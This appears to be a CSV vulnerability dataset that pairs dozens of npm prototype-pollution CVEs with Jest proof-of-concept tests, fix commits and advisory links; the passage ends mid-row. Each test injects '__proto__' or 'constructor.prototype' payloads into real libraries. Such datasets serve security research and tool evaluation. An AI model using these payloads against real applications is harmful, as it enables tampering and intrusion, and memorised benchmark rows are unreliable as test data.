",,dist/utility/merge.js:31:27,https://security.snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157; https://github.com/advisories/GHSA-9mx2-prfp-8hqp
prototype-pollution,CVE-2018-3751,merge-recursive,0.0.3,,prototype-pollution/merge-recursive_0.0.3,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
test(""prototype pollution in merge-recursive"", () => {
  const merge = require(""merge-recursive"").recursive;
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:66:14,https://security.snyk.io/vuln/npm:merge-recursive:20180415; https://github.com/advisories/GHSA-cvxm-f295-x957
prototype-pollution,CVE-2021-25949,set-getter,0.1.0,0.1.1,prototype-pollution/set-getter_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
test(""prototype pollution in set-getter "", () => {
  var setGetter = require(""set-getter"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setGetter(obj, ""__proto__.polluted"", function (polluted) {
    return ""yes"";
  });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/doowb/set-getter/commit/66eb3f0d4686a4a8c7c3d6f7ecd8e570b580edc4,,https://security.snyk.io/vuln/SNYK-JS-SETGETTER-1303099; https://github.com/advisories/GHSA-jv35-xqg7-f92r
prototype-pollution,CVE-2020-7743,mathjs,7.4.0,7.5.1,prototype-pollution/mathjs_7.4.0,"//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
test(""prototype pollution in mathjs "", () => {
  var mathMod = require(""mathjs"");
  const mathjs = mathMod.create(mathMod.all);

  expect({}.polluted).toBe(undefined);

  const newConfig = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  mathjs.config(newConfig);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/josdejong/mathjs/commit/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,lib/utils/object.js:131:17,https://security.snyk.io/vuln/SNYK-JS-MATHJS-1016401; https://github.com/advisories/GHSA-x2fc-mxcx-w4mf
prototype-pollution,CVE-2020-7643,paypal-adaptive,0.4.1,,prototype-pollution/paypal-adaptive_0.4.1,"//https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089

test(""prototype pollution in paypal-adaptive"", () => {
  expect({}.polluted).toBe(undefined);

  const PayPal = require(""paypal-adaptive"");
  const p = new PayPal(
    JSON.parse(
      '{""__proto__"": {""polluted"": ""yes""}, ""userId"": ""foo"", ""password"": ""bar"", ""signature"": ""abcd"", ""appId"": ""1234"", ""sandbox"": ""1234""}'
    )
  );

  expect({}.polluted).toBe(""yes"");
});
",,lib/paypal-adaptive.js:31:22,https://security.snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089; https://github.com/advisories/GHSA-v3r2-3fp4-rp46
prototype-pollution,,nestie,1.0.0,1.0.2,prototype-pollution/nestie_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
test(""prototype pollution in nestie"", () => {
  const { nestie } = require(""nestie"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  nestie({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lukeed/nestie/commit/c571c77928ecd7f256a935c7c3860f33dac4653f,dist/index.js:29:14,https://security.snyk.io/vuln/SNYK-JS-NESTIE-1300518; https://github.com/advisories/GHSA-m7rg-8wvq-846v
prototype-pollution,CVE-2018-16492,extend,3.0.1,1.0.1,prototype-pollution/extend_3.0.1,"//https://hackerone.com/reports/381185
test(""prototype pollution in extend "", () => {
  let extend = require(""extend"");
  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  var obj = {};

  expect({}.polluted).toBe(undefined);

  extend(true, {}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justmoon/node-extend/commit/0e68e71d93507fcc391e398bc84abd0666b28190,index.js:77:20,https://security.snyk.io/vuln/npm:extend:20180424; https://github.com/advisories/GHSA-qrmc-fj45-qfc2
prototype-pollution,CVE-2021-25913,set-or-get,1.2.10,1.2.11,prototype-pollution/set-or-get_1.2.10,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

test(""prototype pollution in set-or-get"", () => {
  var SetOrGet = require(""set-or-get"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  SetOrGet(obj, ""__proto__"", {}).polluted = ""yes"";
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/IonicaBizau/set-or-get.js/commit/82ede5cccb2e8d13e4f62599203a4389f6d8e936,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-SETORGET-1070806; https://github.com/advisories/GHSA-6rv4-4qv6-88g2
prototype-pollution,CVE-2020-7736,bmoor,0.8.11,0.8.12,prototype-pollution/bmoor_0.8.11,"//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
test(""prototype pollution in bmoor"", () => {
  expect({}.polluted).toBe(undefined);

  const bmoor = require(""bmoor"");
  bmoor.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,src/core.js:194:18,https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664; https://github.com/advisories/GHSA-h3rx-g5c9-8q4x
prototype-pollution,CVE-2021-23700,merge-deep2,3.0.5,,prototype-pollution/merge-deep2_3.0.5,"//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
test(""prototype pollution in merge-deep2"", () => {
  const mergeDeep2 = require(""merge-deep2"");
  let obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  mergeDeep2({}, JSON.parse(malicious_payload), true);
  expect({}.polluted).toBe(""yes"");
});
",,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593; https://github.com/advisories/GHSA-j28q-p8ww-cp87
prototype-pollution,CVE-2021-23432,mootools,1.5.2,,prototype-pollution/mootools_1.5.2,"//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
test(""prototype pollution in mootools"", () => {
  require(""mootools"");

  expect({}.polluted).toBe(undefined);

  Object.merge({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",,lib/mootools-core-1.5.2-server.js:355:24,https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536; https://github.com/advisories/GHSA-x6hx-7gh3-3q98
prototype-pollution,CVE-2020-28279,flattenizer,0.0.5,1.1.1,prototype-pollution/flattenizer_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
test(""prototype pollution in flattenizer"", () => {
  expect({}.polluted).toBe(undefined);

  const flattenizer = require(""flattenizer"");
  flattenizer.unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",,lib/flattenizer.min.js:1:1550,https://security.snyk.io/vuln/SNYK-JS-FLATTENIZER-1054934; 
prototype-pollution,CVE-2020-7772,doc-path,2.0.0,2.3.0,prototype-pollution/doc-path_2.0.0,"//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
test(""prototype pollution in doc-path"", () => {
  const path = require(""doc-path"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  path.setPath({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mrodrig/doc-path/commit/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,src/path.js:54:27,https://security.snyk.io/vuln/SNYK-JS-DOCPATH-1011952; https://github.com/advisories/GHSA-gm8g-xhh8-rmwr
prototype-pollution,CVE-2018-16487,lodash,4.17.9,4.17.11,prototype-pollution/lodash_4.17.9,"//https://hackerone.com/reports/380873
test(""prototype pollution in lodash"", () => {
  const _ = require(""lodash"");
  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  expect({}.polluted).toBe(undefined);
  _.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,lodash.js:2573:21,https://hackerone.com/reports/380873; https://security.snyk.io/vuln/SNYK-JS-LODASH-73638; https://github.com/advisories/GHSA-h726-x36v-rx45
prototype-pollution,CVE-2020-28273,set-in,1.0.0,2.0.1,prototype-pollution/set-in_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
test(""prototype pollution in set-in"", () => {
  const si = require(""set-in"");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  si(obj, [""__proto__"", ""polluted""], ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/ahdinosaur/set-in/commit/e431effa00195a6f06b111e09733cd1445a91a88,index.js:41:17,https://security.snyk.io/vuln/SNYK-JS-SETIN-1048049; https://github.com/advisories/GHSA-qr4p-c9wr-phr6
prototype-pollution,,nested-property,0.0.5,3.0.0,prototype-pollution/nested-property_0.0.5,"//https://snyk.io/test/npm/nested-property/0.0.5

test(""prototype pollution in nested-property"", () => {
  const nestedProperty = require(""nested-property"");
  const object1 = {};
  expect({}.polluted).toBe(undefined);
  nestedProperty.set(object1, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cosmosio/nested-property/commit/881cf37eb956641fc26011ff66a436eb603c89d1,index.js:95:27,https://security.snyk.io/vuln/SNYK-JS-NESTEDPROPERTY-1022154; 
prototype-pollution,CVE-2018-16486,defaults-deep,0.2.4,,prototype-pollution/defaults-deep_0.2.4,"//https://hackerone.com/reports/380878
test(""prototype pollution in defaults-deep "", () => {
  const defaultsDeep = require(""defaults-deep"");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  defaultsDeep({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",,index.js:26:21,https://security.snyk.io/vuln/SNYK-JS-DEFAULTSDEEP-173661; https://github.com/advisories/GHSA-pjxw-22xf-6pwc
prototype-pollution,CVE-2020-7719,locutus,2.0.11,2.0.12,prototype-pollution/locutus_2.0.11,"//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
test(""prototype pollution in locutus"", () => {
  try {
    polluted;
    expect(true).toBe(false);
  } catch (e) {
    expect(true).toBe(true);
  }

  const locutus = require(""locutus"");
  locutus.php.strings.parse_str(""__proto__[polluted]=yes"");

  expect(polluted).toBe(""yes"");
});
",,,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-598675; https://github.com/advisories/GHSA-f98m-q3hr-p5wq
prototype-pollution,CVE-2021-23452,x-assign,0.1.4,,prototype-pollution/x-assign_0.1.4,"//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
test(""prototype pollution in x-assign"", () => {
  const XAssign = require(""x-assign"");

  expect({}.polluted).toBe(undefined);

  const a = { red: ""apple"" };
  const b = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  const c = XAssign.assign(a, b);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:34:20,https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314; https://github.com/advisories/GHSA-4mvj-rq4v-2fxw
prototype-pollution,CVE-2018-3753,merge-objects,1.0.3,,prototype-pollution/merge-objects_1.0.3,"//https://snyk.io/vuln/npm:merge-objects:20180415
test(""prototype pollution in merge-objects"", () => {
  const merge = require(""merge-objects"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",,merge-objects.js:20:20,https://security.snyk.io/vuln/npm:merge-objects:20180415; https://github.com/advisories/GHSA-fp82-2h99-3fpp
prototype-pollution,CVE-2020-7771,asciitable.js,1.0.2,1.0.3,prototype-pollution/asciitable.js_1.0.2,"//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
test(""Prototype pollution in asciitable.js"", () => {
  expect({}.polluted).toBe(undefined);

  const req = require(""asciitable.js"");
  const b = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  req({}, b);

  expect({}.polluted).toBe(""yes"");
});
",,asciitable.umd.js:50:104,https://security.snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799; https://github.com/advisories/GHSA-5pxj-mhwj-x5gv
prototype-pollution,CVE-2020-28499,merge,2.1.0,,prototype-pollution/merge_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MERGE-1042987

test(""prototype pollution in merge"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge"");
  const payload2 = JSON.parse('{""x"": {""__proto__"":{""polluted"":""yes""}}}');
  let obj1 = { x: { y: 1 } };
  merge.recursive(obj1, payload2);

  expect({}.polluted).toBe(""yes"");
});
",,lib/src/index.js:59:19,https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987; https://github.com/advisories/GHSA-7wpw-2hjm-89gp
prototype-pollution,,objnest,5.0.0,5.1.0,prototype-pollution/objnest_5.0.0,"//https://github.com/okunishinishi/node-objnest/pull/6
test(""prototype pollution in objnest"", () => {
  const objnest = require(""objnest"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  objnest.expand({ ""__proto__.polluted"": ""yes"" });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/okunishinishi/node-objnest/commit/c541e1a775b562d63402a14dac9f8cbc52b116d7,lib/objnest.js:44:35,https://security.snyk.io/vuln/SNYK-JS-OBJNEST-1041787; 
prototype-pollution,CVE-2021-25927,flat,5.0.0,2.0.2,prototype-pollution/flat_5.0.0,"//https://snyk.io/vuln/SNYK-JS-FLAT-596927
test(""prototype pollution in flat"", () => {
  var unflatten = require(""flat"").unflatten;

  expect({}.polluted).toBe(undefined);

  unflatten({
    ""__proto__.polluted"": ""yes"",
  });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,index.js:145:21,https://security.snyk.io/vuln/SNYK-JS-FLAT-596927; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
prototype-pollution,CVE-2021-25928,safe-obj,1.0.0,,prototype-pollution/safe-obj_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

test(""prototype pollution in safeObj"", () => {
  var safeObj = require(""safe-obj"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeObj.expand(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:122:28,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJ-1277111; https://github.com/advisories/GHSA-wpgh-hmv4-r3v5
prototype-pollution,CVE-2020-7751,pathval,1.1.0,1.1.1,prototype-pollution/pathval_1.1.0,"//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
test(""prototype pollution in pathval"", () => {
  var pathval = require(""pathval"");

  var obj = {};
  expect({}.polluted).toBe(undefined);

  pathval.setPathValue(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/chaijs/pathval/commit/7859e0e1ce4c2c67de897edce097ed31f80661d0,index.js:158:25,https://security.snyk.io/vuln/SNYK-JS-PATHVAL-596926; 
prototype-pollution,CVE-2021-23444,jointjs,3.4.0,3.4.2,prototype-pollution/jointjs_3.4.0,"//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
test(""prototype pollution in jointjs"", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require(""jointjs"");
  jointjs.util.setByPath({}, [[""__proto__""], ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:8:103865,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
prototype-pollution,CVE-2020-7765,@firebase/util,0.3.3,0.3.4,prototype-pollution/firebase-util_0.3.3-canary.c47ba31d0,"//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
test(""prototype pollution in @firebase/util"", () => {
  expect({}.polluted).toBe(undefined);

  const util = require(""@firebase/util"");
  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  const a = {
    nest: {
      number: 1,
      string: ""1"",
      object: { key: ""1"" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  var result = util.deepExtend(a, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
prototype-pollution,CVE-2020-7598,minimist,1.0.0,0.2.1,prototype-pollution/minimist_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MINIMIST-559764
test(""prototype pollution in minimist"", () => {
  expect({}.polluted).toBe(undefined);

  require(""minimist"")(""--__proto__.polluted yes"".split("" ""));

  expect({}.polluted).toBe(""yes"");
});
",,index.js:189:16,https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764; https://github.com/advisories/GHSA-vh95-rmgr-6w4m
prototype-pollution,CVE-2021-25945,js-extend,0.0.1,,prototype-pollution/js-extend_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
test(""prototype pollution in js-extend"", () => {
  expect({}.polluted).toBe(undefined);

  const jsExtend = require(""js-extend"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  jsExtend.extend({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,extend.js:17:23,https://security.snyk.io/vuln/SNYK-JS-JSEXTEND-1297101; https://github.com/advisories/GHSA-mh82-55cm-6gfh
prototype-pollution,CVE-2018-16472,cached-path-relative,1.0.1,1.0.2,prototype-pollution/cached-path-relative_1.0.1,"//https://hackerone.com/reports/390847
test(""prototype pollution in cached-path-relative"", () => {
  expect({}.polluted).toBe(undefined);

  var relative = require(""cached-path-relative"");
  relative(""__proto__"", ""polluted"");

  expect({}.polluted).not.toBe(undefined);
});
",https://github.com/ashaffer/cached-path-relative/commit/a43cffec84ed0e9eceecb43b534b6937a8028fc0,lib/index.js:39:19,https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573; https://github.com/advisories/GHSA-hc9w-4p87-j549
prototype-pollution,,ts-dot-prop,1.4.0,1.4.1,prototype-pollution/ts-dot-prop_1.4.0,"//https://hackerone.com/reports/980599
test(""prototype pollution in ts-dot-prop"", () => {
  const tsDot = require(""ts-dot-prop"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  tsDot.set(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justinlettau/ts-dot-prop/commit/816b887a669ab959c3c2f85c6563d33928f00f14#diff-f41e9d04a45c83f3b6f6e630f10117feR183,src/index.ts:72:21,https://security.snyk.io/vuln/SNYK-JS-TSDOTPROP-1024441; 
prototype-pollution,,@lyngs/merge,1.0.9,,prototype-pollution/lyngs-merge_1.0.9,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
test(""prototype pollution in @lyngs/merge"", () => {
  const { merge } = require(""@lyngs/merge"");
  expect({}.polluted).toBe(undefined);
  merge({ dummy: 1 }, JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`));
  expect({}.polluted).toBe(""yes"");
});
",,merge/dist/index.js:2684:20,https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823; 
prototype-pollution,CVE-2021-25946,nconf-toml,0.0.1,,prototype-pollution/nconf-toml_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946

test(""prototype pollution in nconf-toml"", () => {
  expect({}.polluted).toBe(undefined);

  const nt = require(""nconf-toml"");
  const fs = require(""fs"");
  const path = require(""path"");

  nt.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",,lib/compiler.js:55:18,https://security.snyk.io/vuln/SNYK-JS-NCONFTOML-1296831; https://github.com/advisories/GHSA-hx7j-43w2-7rj7
prototype-pollution,CVE-2020-8147,utils-extend,1.0.8,,prototype-pollution/utils-extend_1.0.8,"//https://hackerone.com/reports/801522

test(""prototype pollution in utils-extend"", () => {
  const { extend } = require(""utils-extend"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  const pollutionObject = JSON.parse(payload);
  extend({}, pollutionObject);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:46:19,https://security.snyk.io/vuln/SNYK-JS-UTILSEXTEND-560385; https://github.com/advisories/GHSA-6pq3-928q-x6w6
prototype-pollution,CVE-2020-28280,predefine,0.1.2,,prototype-pollution/predefine_0.1.2,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
test(""prototype pollution in predefine"", () => {
  expect({}.polluted).toBe(undefined);

  var predefine = require(""predefine"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  predefine.merge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:284:21,https://security.snyk.io/vuln/SNYK-JS-PREDEFINE-1054935; https://github.com/advisories/GHSA-mx3x-ghqm-r43h
prototype-pollution,CVE-2020-28283,libnested,1.5.0,1.5.1,prototype-pollution/libnested_1.5.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
test(""prototype pollution in libnested"", () => {
  expect({}.polluted).toBe(undefined);

  const libnested = require(""libnested"");
  libnested.set({}, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/dominictarr/libnested/commit/9619863a319ed1e5c19ddcbdbe3312f9cef72760,index.js:27:20,https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-1054930; https://github.com/advisories/GHSA-3r9x-mjrm-2725
prototype-pollution,CVE-2021-25943,101,1.0.0,,prototype-pollution/101_1.0.0,"test(""prototype pollution in 101/set"", () => {
  expect({}.polluted).toBe(undefined);

  const _101 = require(""101/set"");
  // console.log(_101)
  _101({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,index.js:32:16,https://github.com/advisories/GHSA-cwcx-rxgc-cmw3; https://security.snyk.io/vuln/SNYK-JS-101-1292345
prototype-pollution,CVE-2019-10808,utilitify,1.0.2,1.0.3,prototype-pollution/utilitify_1.0.2,"//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
test(""prototype pollution in utilitify"", () => {
  const { mergeDeep } = require(""utilitify"");
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  var result = mergeDeep(
    { a: { b: { c: ""c"", d: ""d"" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/xcritical-software/utilitify/commit/88d6e27009823338bf319ffb768fe6b08e8ad2d1,utils/utils/mergeDeep.ts:17:18,https://security.snyk.io/vuln/SNYK-JS-UTILITIFY-559497; https://github.com/advisories/GHSA-9534-h433-2rjf
prototype-pollution,CVE-2020-7727,gedi,1.6.3,,prototype-pollution/gedi_1.6.3,"//https://snyk.io/vuln/SNYK-JS-GEDI-598803
test(""prototype pollution in gedi"", () => {
  expect({}.polluted).toBe(undefined);

  const gedi = require(""gedi"");
  gedi().set(""[__proto__/polluted]"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,gedi.js:393:32,https://security.snyk.io/vuln/SNYK-JS-GEDI-598803; https://github.com/advisories/GHSA-jh2m-j8pp-55rc
prototype-pollution,CVE-2020-7724,tiny-conf,1.1.0,,prototype-pollution/tiny-conf_1.1.0,"//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
test(""prototype pollution in tinyConf"", () => {
  const tinyConf = require(""tiny-conf"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  tinyConf.set(""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,tiny-conf.js:73:17,https://security.snyk.io/vuln/SNYK-JS-TINYCONF-598792; https://github.com/advisories/GHSA-4q97-fh3f-j294
prototype-pollution,,sahmat,1.0.0,,prototype-pollution/sahmat_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
test(""prototype pollution in sahmat"", () => {
  const sahmat = require(""sahmat"");
  let obj = { tmp: """" };

  expect({}.polluted).toBe(undefined);

  sahmat(obj, ""tmp"", (obj.__proto__.polluted = ""yes""));

  expect(obj.tmp.polluted).toBe(""yes"");
});
",,build/utils.js:391:28,https://github.com/advisories/GHSA-83pq-466j-fc6j; 
prototype-pollution,CVE-2020-7718,gammautils,0.0.81,,prototype-pollution/gammautils_0.0.81,"//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
test(""prototype pollution in gammautils"", () => {
  expect({}.polluted).toBe(undefined);

  const gammautils = require(""gammautils"");
  var payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  gammautils.object.deepMerge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",,lib/objectUtils.js:146:34,https://security.snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670; https://github.com/advisories/GHSA-pgmg-gf5p-54j8
prototype-pollution,CVE-2021-23509,json-ptr,1.1.0,3.0.0,prototype-pollution/json-ptr_1.1.0,"//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
test(""prototype pollution in json-ptr"", () => {
  expect({}.polluted).toBe(undefined);

  const { JsonPointer } = require(""json-ptr"");
  JsonPointer.set({}, ""/constructor/prototype/polluted"", ""yes"", true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/flitbit/json-ptr/commit/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,index.js:277:26,https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1577291; https://github.com/advisories/GHSA-8gwj-8hxc-285w
prototype-pollution,CVE-2021-23434,object-path,0.11.4,0.11.6,prototype-pollution/object-path_0.11.4,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
test(""prototype pollution in object-path"", () => {
  const objectPath = require(""object-path"");

  expect({}.polluted).toBe(undefined);
  objectPath.withInheritedProps.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb,index.js:110:28,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453; https://github.com/advisories/GHSA-v39p-96qg-c8rf
prototype-pollution,CVE-2021-25914,object-collider,1.0.3,1.0.4,prototype-pollution/object-collider_1.0.3,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

test(""prototype pollution in object-collider"", () => {
  var { collide } = require(""object-collider"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  collide(obj, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/FireBlinkLTD/object-collider/commit/321f75a7f8e7b3393e5b7dd6dd9ab26ede5906e5,src/utils/CollideUtil.ts:83:22,https://security.snyk.io/vuln/SNYK-JS-OBJECTCOLLIDER-1080739; https://github.com/advisories/GHSA-85g2-29m8-qf2p
prototype-pollution,CVE-2020-7700,phpjs,1.3.2,,prototype-pollution/phpjs_1.3.2,"//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

test(""prototype pollution in phpjs"", () => {
  expect({}.polluted).toBe(undefined);

  const p = require(""phpjs"");
  p.parse_str(""__proto__[polluted]=yes"", {});

  expect({}.polluted).toBe(""yes"");
});
",,build/npm.js:6406:24,https://security.snyk.io/vuln/SNYK-JS-PHPJS-598681; https://github.com/advisories/GHSA-m428-jqc4-2p5j
prototype-pollution,CVE-2020-28272,keyget,2.2.0,2.3.0,prototype-pollution/keyget_2.2.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272
test(""prototype pollution in keyget"", () => {
  var keyget = require(""keyget"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  keyget.set({}, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/rumkin/keyget/commit/17d15b6c75036eb429075a8cfeccfc18094dd2e2,index.js:111:17,https://security.snyk.io/vuln/SNYK-JS-KEYGET-1048048; 
prototype-pollution,CVE-2021-26707,merge-deep,3.0.0,3.0.3,prototype-pollution/merge-deep_3.0.0,"// https://snyk.io/vuln/npm:merge-deep:20180215
test(""prototype pollution in merge-deep"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge-deep"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/merge-deep/commit/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP-1070277; https://github.com/advisories/GHSA-r6rj-9ch6-g264
prototype-pollution,CVE-2020-7774,y18n,3.2.1,5.0.5,prototype-pollution/y18n_3.2.1,"//https://snyk.io/test/npm/y18n/3.1.0

test(""prototype pollution in y18n"", () => {
  const y18n = require(""y18n"")();
  obj = {};

  expect({}.polluted).toBe(undefined);

  y18n.setLocale(""__proto__"");
